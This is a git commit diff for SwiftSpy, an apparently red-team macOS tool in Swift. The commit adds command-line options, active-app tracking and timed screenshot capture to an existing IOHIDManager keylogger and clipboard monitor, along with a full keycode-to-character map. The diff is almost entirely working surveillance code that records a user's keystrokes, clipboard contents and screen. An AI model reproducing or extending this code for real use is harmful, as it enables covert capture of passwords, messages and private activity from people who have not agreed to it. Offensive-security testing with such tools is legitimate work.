63a50e3901cbdbfcbc528f28db8d2404caa707db
Justin Bui <jbui@specterops.io>
2020-09-18 13:37:01 -0700

    added commmand line parsing + screenshots functionality

--- SwiftSpy/main.swift
+++ SwiftSpy/main.swift
@@ -2,12 +2,139 @@ import Cocoa
 import Foundation
 import IOKit.hid
 import AppKit
-
+import AVFoundation
 
 var capslock = false
 
+var keyMap: [UInt32:[String]]
+{
+    var map = [UInt32:[String]]()
+    map[4] = ["a","A"]
+    map[5] = ["b","B"]
+    map[6] = ["c","C"]
+    map[7] = ["d","D"]
+    map[8] = ["e","E"]
+    map[9] = ["f","F"]
+    map[10] = ["g","G"]
+    map[11] = ["h","H"]
+    map[12] = ["i","I"]
+    map[13] = ["j","J"]
+    map[14] = ["k","K"]
+    map[15] = ["l","L"]
+    map[16] = ["m","M"]
+    map[17] = ["n","N"]
+    map[18] = ["o","O"]
+    map[19] = ["p","P"]
+    map[20] = ["q","Q"]
+    map[21] = ["r","R"]
+    map[22] = ["s","S"]
+    map[23] = ["t","T"]
+    map[24] = ["u","U"]
+    map[25] = ["v","V"]
+    map[26] = ["w","W"]
+    map[27] = ["x","X"]
+    map[28] = ["y","Y"]
+    map[29] = ["z","Z"]
+    map[30] = ["1","!"]
+    map[31] = ["2","@"]
+    map[32] = ["3","#"]
+    map[33] = ["4","$"]
+    map[34] = ["5","%"]
+    map[35] = ["6","^"]
+    map[36] = ["7","&"]
+    map[37] = ["8","*"]
+    map[38] = ["9","("]
+    map[39] = ["0",")"]
+    map[40] = ["\n","\n"]
+    map[41] = ["[ESCAPE]","[ESCAPE]"]
+    map[42] = ["[DELETE|BACKSPACE]","[DELETE|BACKSPACE]"] //
+    map[43] = ["[TAB]","[TAB]"]
+    map[44] = [" "," "]
+    map[45] = ["-","_"]
+    map[46] = ["=","+"]
+    map[47] = ["[","{"]
+    map[48] = ["]","}"]
+    map[49] = ["\\","|"]
+    map[50] = ["",""] // Keyboard Non-US# and ~2
+    map[51] = [";",":"]
+    map[52] = ["'","\""]
+    map[53] = ["`","~"]
+    map[54] = [",","<"]
+    map[55] = [".",">"]
+    map[56] = ["/","?"]
+    map[57] = ["[CAPSLOCK]","[CAPSLOCK]"]
+    map[58] = ["[F1]","[F1]"]
+    map[59] = ["[F2]","[F2]"]
+    map[60] = ["[F3]","[F3]"]
+    map[61] = ["[F4]","[F4]"]
+    map[62] = ["[F5]","[F5]"]
+    map[63] = ["[F6]","[F6]"]
+    map[64] = ["[F7]","[F7]"]
+    map[65] = ["[F8]","[F8]"]
+    map[66] = ["[F9]","[F9]"]
+    map[67] = ["[F10]","[F10]"]
+    map[68] = ["[F11]","[F11]"]
+    map[69] = ["[F12]","[F12]"]
+    map[70] = ["[PRINTSCREEN]","[PRINTSCREEN]"]
+    map[71] = ["[SCROLL-LOCK]","[SCROLL-LOCK]"]
+    map[72] = ["[PAUSE]","[PAUSE]"]
+    map[73] = ["[INSERT]","[INSERT]"]
+    map[74] = ["[HOME]","[HOME]"]
+    map[75] = ["[PAGEUP]","[PAGEUP]"]
+    map[76] = ["[DELETE-FORWARD]","[DELETE-FORWARD]"] //
+    map[77] = ["[END]","[END]"]
+    map[78] = ["[PAGEDOWN]","[PAGEDOWN]"]
+    map[79] = ["[RIGHTARROW]","[RIGHTARROW]"]
+    map[80] = ["[LEFTARROW]","[LEFTARROW]"]
+    map[81] = ["[DOWNARROW]","[DOWNARROW]"]
+    map[82] = ["[UPARROW]","[UPARROW]"]
+    map[83] = ["[NUMLOCK]","[CLEAR]"]
+    // Keypads
+    map[84] = ["/","/"]
+    map[85] = ["*","*"]
+    map[86] = ["-","-"]
+    map[87] = ["+","+"]
+    map[88] = ["[ENTER]","[ENTER]"]
+    map[89] = ["1","[END]"]
+    map[90] = ["2","[DOWNARROW]"]
+    map[91] = ["3","[PAGEDOWN]"]
+    map[92] = ["4","[LEFTARROW]"]
+    map[93] = ["5","5"]
+    map[94] = ["6","[RIGHTARROW]"]
+    map[95] = ["7","[HOME]"]
+    map[96] = ["8","[UPARROW]"]
+    map[97] = ["9","[PAGEUP]"]
+    map[98] = ["0","[INSERT]"]
+    map[99] = [".","[DELETE]"]
+    map[100] = ["",""] //
+    /////
+    map[224] = ["[LCTRL]","[LCTRL]"] // left control
+    map[225] = ["[LSHIFT_PRESS]","[SHIFT_RELEASE]"] // left shift
+    map[226] = ["[LALT]","[LALT]"] // left alt
+    map[227] = ["[LCMD]","[LCMD]"] // left cmd
+    map[228] = ["[RCTRL]","[RCTRL]"] // right control
+    map[229] = ["[RSHIFT_PRESS]","[SHIFT_RELEASE]"] // right shift
+    map[230] = ["[RALT]","[RALT]"] // right alt
+    map[231] = ["[RCMD]","[RCMD]"] // right cmd
+    return map
+}
+
 class SwiftSpy
 {
+    func ActiveApp()
+    {
+        // Hook active application
+        let notificationCenter = NSWorkspace.shared.notificationCenter
+        notificationCenter.addObserver(forName: NSWorkspace.didActivateApplicationNotification, object: nil, queue: OperationQueue.main)
+        {   (notificationCenter: Notification) in
+            
+            let currentApp = notificationCenter.userInfo!["NSWorkspaceApplicationKey"] as! NSRunningApplication
+            print("")
+            print("[+] New Active App:", currentApp.localizedName!)
+        }
+        RunLoop.current.run()
+    }
+    
     func ClipboardMonitor()
     {
         let pasteboard = NSPasteboard.general
@@ -18,21 +145,23 @@ class SwiftSpy
             {
                 if pasteboard.changeCount != changeCount
                 {
+                    print("")
                     print("[+] Copy event detected at", NSDate(), "(UTC)!")
                     print("[+] Clipboard Data:", clipboardData)
                     changeCount = pasteboard.changeCount
                     
-                    let procs = NSWorkspace.shared.runningApplications
-                    for currentApp in procs
-                    {
-                        if(currentApp.activationPolicy == .regular)
-                        {
-                            if(currentApp.ownsMenuBar)
-                            {
-                                print("[+] Clipboard Active App:", currentApp.localizedName!)
-                            }
-                        }
-                    }
+//                    let procs = NSWorkspace.shared.runningApplications
+//                    for currentApp in procs
+//                    {
+//                        if(currentApp.activationPolicy == .regular)
+//                        {
+//                            if(currentApp.ownsMenuBar && currentApp.isActive)
+//                            {
+//                                print("[+] Clipboard Active App:", currentApp.localizedName!)
+//                                print("")
+//                            }
+//                        }
+//                    }
                 }
             }
         }
@@ -157,148 +286,135 @@ class SwiftSpy
             print("[+] HID manager opened!")
         }
         
-        // Hook active application
-        let notificationCenter = NSWorkspace.shared.notificationCenter
-        notificationCenter.addObserver(forName: NSWorkspace.didActivateApplicationNotification, object: nil, queue: OperationQueue.main)
-        {   (notificationCenter: Notification) in
-            
-            let currentApp = notificationCenter.userInfo!["NSWorkspaceApplicationKey"] as! NSRunningApplication
-            print("\n[+] Keylogger Active App:", currentApp.localizedName!)
-        }
+//        // Hook active application
+//        let notificationCenter = NSWorkspace.shared.notificationCenter
+//        notificationCenter.addObserver(forName: NSWorkspace.didActivateApplicationNotification, object: nil, queue: OperationQueue.main)
+//        {   (notificationCenter: Notification) in
+//
+//            let currentApp = notificationCenter.userInfo!["NSWorkspaceApplicationKey"] as! NSRunningApplication
+//            print("")
+//            print("[+] Keylogger Active App:", currentApp.localizedName!)
+//        }
         
         // Start RunLoop
         IOHIDManagerScheduleWithRunLoop(HIDManager, CFRunLoopGetCurrent(), CFRunLoopMode.defaultMode.rawValue)
         RunLoop.current.run()
     }
+    
+    // https://stackoverflow.com/questions/39691106/programmatically-screenshot-swift-3-macos/40864231#40864231
+    func Screenshot(folderName: String)
+    {
+         var displayCount: UInt32 = 0;
+         var result = CGGetActiveDisplayList(0, nil, &displayCount)
+         if (result != CGError.success) {
+             print("Error: \(result)")
+             return
+         }
+         let allocated = Int(displayCount)
+         let activeDisplays = UnsafeMutablePointer<CGDirectDisplayID>.allocate(capacity: allocated)
+         result = CGGetActiveDisplayList(displayCount, activeDisplays, &displayCount)
+         
+         if (result != CGError.success) {
+             print("Error: \(result)")
+             return
+         }
+            
+         for i in 1...displayCount {
+            let unixTimestamp = Date()
+            let fileUrl = URL(fileURLWithPath: folderName + "\(unixTimestamp)" + "_" + "\(i)" + ".jpg", isDirectory: true)
+            let screenShot:CGImage = CGDisplayCreateImage(activeDisplays[Int(i-1)])!
+            let bitmapRep = NSBitmapImageRep(cgImage: screenShot)
+            let jpegData = bitmapRep.representation(using: NSBitmapImageRep.FileType.jpeg, properties: [:])!
+             
+            do {
+                try jpegData.write(to: fileUrl, options: .atomic)
+            }
+            catch {print("Error: \(error)")}
+         }
+     }
 }
 
-var keyMap: [UInt32:[String]]
+func Help()
 {
-    var map = [UInt32:[String]]()
-    map[4] = ["a","A"]
-    map[5] = ["b","B"]
-    map[6] = ["c","C"]
-    map[7] = ["d","D"]
-    map[8] = ["e","E"]
-    map[9] = ["f","F"]
-    map[10] = ["g","G"]
-    map[11] = ["h","H"]
-    map[12] = ["i","I"]
-    map[13] = ["j","J"]
-    map[14] = ["k","K"]
-    map[15] = ["l","L"]
-    map[16] = ["m","M"]
-    map[17] = ["n","N"]
-    map[18] = ["o","O"]
-    map[19] = ["p","P"]
-    map[20] = ["q","Q"]
-    map[21] = ["r","R"]
-    map[22] = ["s","S"]
-    map[23] = ["t","T"]
-    map[24] = ["u","U"]
-    map[25] = ["v","V"]
-    map[26] = ["w","W"]
-    map[27] = ["x","X"]
-    map[28] = ["y","Y"]
-    map[29] = ["z","Z"]
-    map[30] = ["1","!"]
-    map[31] = ["2","@"]
-    map[32] = ["3","#"]
-    map[33] = ["4","$"]
-    map[34] = ["5","%"]
-    map[35] = ["6","^"]
-    map[36] = ["7","&"]
-    map[37] = ["8","*"]
-    map[38] = ["9","("]
-    map[39] = ["0",")"]
-    map[40] = ["\n","\n"]
-    map[41] = ["[ESCAPE]","[ESCAPE]"]
-    map[42] = ["[DELETE|BACKSPACE]","[DELETE|BACKSPACE]"] //
-    map[43] = ["[TAB]","[TAB]"]
-    map[44] = [" "," "]
-    map[45] = ["-","_"]
-    map[46] = ["=","+"]
-    map[47] = ["[","{"]
-    map[48] = ["]","}"]
-    map[49] = ["\\","|"]
-    map[50] = ["",""] // Keyboard Non-US# and ~2
-    map[51] = [";",":"]
-    map[52] = ["'","\""]
-    map[53] = ["`","~"]
-    map[54] = [",","<"]
-    map[55] = [".",">"]
-    map[56] = ["/","?"]
-    map[57] = ["[CAPSLOCK]","[CAPSLOCK]"]
-    map[58] = ["[F1]","[F1]"]
-    map[59] = ["[F2]","[F2]"]
-    map[60] = ["[F3]","[F3]"]
-    map[61] = ["[F4]","[F4]"]
-    map[62] = ["[F5]","[F5]"]
-    map[63] = ["[F6]","[F6]"]
-    map[64] = ["[F7]","[F7]"]
-    map[65] = ["[F8]","[F8]"]
-    map[66] = ["[F9]","[F9]"]
-    map[67] = ["[F10]","[F10]"]
-    map[68] = ["[F11]","[F11]"]
-    map[69] = ["[F12]","[F12]"]
-    map[70] = ["[PRINTSCREEN]","[PRINTSCREEN]"]
-    map[71] = ["[SCROLL-LOCK]","[SCROLL-LOCK]"]
-    map[72] = ["[PAUSE]","[PAUSE]"]
-    map[73] = ["[INSERT]","[INSERT]"]
-    map[74] = ["[HOME]","[HOME]"]
-    map[75] = ["[PAGEUP]","[PAGEUP]"]
-    map[76] = ["[DELETE-FORWARD]","[DELETE-FORWARD]"] //
-    map[77] = ["[END]","[END]"]
-    map[78] = ["[PAGEDOWN]","[PAGEDOWN]"]
-    map[79] = ["[RIGHTARROW]","[RIGHTARROW]"]
-    map[80] = ["[LEFTARROW]","[LEFTARROW]"]
-    map[81] = ["[DOWNARROW]","[DOWNARROW]"]
-    map[82] = ["[UPARROW]","[UPARROW]"]
-    map[83] = ["[NUMLOCK]","[CLEAR]"]
-    // Keypads
-    map[84] = ["/","/"]
-    map[85] = ["*","*"]
-    map[86] = ["-","-"]
-    map[87] = ["+","+"]
-    map[88] = ["[ENTER]","[ENTER]"]
-    map[89] = ["1","[END]"]
-    map[90] = ["2","[DOWNARROW]"]
-    map[91] = ["3","[PAGEDOWN]"]
-    map[92] = ["4","[LEFTARROW]"]
-    map[93] = ["5","5"]
-    map[94] = ["6","[RIGHTARROW]"]
-    map[95] = ["7","[HOME]"]
-    map[96] = ["8","[UPARROW]"]
-    map[97] = ["9","[PAGEUP]"]
-    map[98] = ["0","[INSERT]"]
-    map[99] = [".","[DELETE]"]
-    map[100] = ["",""] //
-    /////
-    map[224] = ["[LCTRL]","[LCTRL]"] // left control
-    map[225] = ["[LSHIFT_PRESS]","[SHIFT_RELEASE]"] // left shift
-    map[226] = ["[LALT]","[LALT]"] // left alt
-    map[227] = ["[LCMD]","[LCMD]"] // left cmd
-    map[228] = ["[RCTRL]","[RCTRL]"] // right control
-    map[229] = ["[RSHIFT_PRESS]","[SHIFT_RELEASE]"] // right shift
-    map[230] = ["[RALT]","[RALT]"] // right alt
-    map[231] = ["[RCMD]","[RCMD]"] // right cmd
-    return map
+    print("SwiftSpy by @slyd0g")
+    print("Usage:")
+    print("-h || -help        | Print help menu")
+    print("-keylog            | Logs all keystrokes to stdout using IOHIDManager* APIs, requires 'Input Monitoring' permissions")
+    print("-clipboard         | Monitors for changes to the system clipboard and logs to stdout")
+    print("-allkeys           | Runs both the keylog and clipboard modules, requires 'Input Monitoring' permissions")
+    print("-screenshot /tmp   | Takes a screenshot of the user's screen and saves to the /tmp, requires 'Screen Recording` permissions")
+    print("-screenshot /tmp 5 | Takes a screenshot every 5 seconds and saves to /tmp, requires 'Screen Recording` permissions")
 }
-
 
 var swiftSpy = SwiftSpy()
 
-swiftSpy.Keylog()
+if CommandLine.arguments.count == 1
+{
+    Help()
+    exit(0)
+}
+else
+{
+    for argument in CommandLine.arguments
+    {
+        if (argument.contains("-h") || argument.contains("-help"))
+        {
+            Help()
+            exit(0)
+        }
+        else
+        {
+            if argument.contains("-keylog")
+            {
+                DispatchQueue.global(qos: .background).async {
+                    swiftSpy.Keylog()
 
-// Keylog testing
-//DispatchQueue.global(qos: .background).async {
-//    swiftSpy.Keylog()
-//}
-//swiftSpy.ActiveWindow();
+                }
+                swiftSpy.ActiveApp()
+            }
+            if argument.contains("-clipboard")
+            {
+                DispatchQueue.global(qos: .background).async {
+                    swiftSpy.ClipboardMonitor()
 
-// Clipboard testing
-//swiftSpy.ClipboardMonitor()
+                }
+                swiftSpy.ActiveApp()
+            }
+            if argument.contains("-allkeys")
+            {
+                DispatchQueue.global(qos: .background).async {
+                    swiftSpy.ClipboardMonitor()
 
-//swiftSpy.ActiveWindow2()
+                }
+                DispatchQueue.global(qos: .background).async {
+                    swiftSpy.Keylog()
 
+                }
+                swiftSpy.ActiveApp()
+            }
+            if argument.contains("-screenshot")
+            {
+                var folder = CommandLine.arguments[2]
+                if (!folder.hasSuffix("/"))
+                {
+                    folder.append("/")
+                }
 
+                if CommandLine.arguments.count == 4
+                {
+                    let timer = UInt32(CommandLine.arguments[3])
+
+                    while(true)
+                    {
+                        swiftSpy.Screenshot(folderName: folder)
+                        sleep(timer!)
+                    }
+                }
+                else
+                {
+                    swiftSpy.Screenshot(folderName: folder)
+                }
+            }
+        }
+    }
+}
